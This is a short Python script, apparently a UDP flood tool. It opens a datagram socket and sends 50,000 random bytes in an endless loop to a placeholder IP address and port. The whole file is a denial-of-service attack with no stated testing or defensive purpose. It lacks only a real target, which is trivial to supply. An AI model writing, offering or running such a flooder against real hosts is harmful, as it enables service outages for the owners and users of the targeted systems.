import socket
import os

bytes = os.urandom(50000)
my_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
uri = "00.000.00.00"
port = 00
destination = (uri, port)

while True:
    my_socket.sendto(bytes, destination)